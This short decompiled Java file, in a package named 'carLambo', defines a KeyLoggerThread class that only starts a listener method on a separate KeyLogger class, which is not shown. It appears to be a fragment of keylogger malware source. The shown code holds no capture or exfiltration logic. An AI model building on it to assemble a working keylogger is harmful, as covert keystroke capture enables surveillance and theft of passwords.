package carLambo;

final class KeyLoggerThread implements Runnable {
   // $FF: synthetic field
   private KeyLogger keyLogger;

   KeyLoggerThread(KeyLogger keyLogger) {
      this.keyLogger = keyLogger;
      
   }

   public final void run() {
      KeyLogger.listener(this.keyLogger);
   }
}
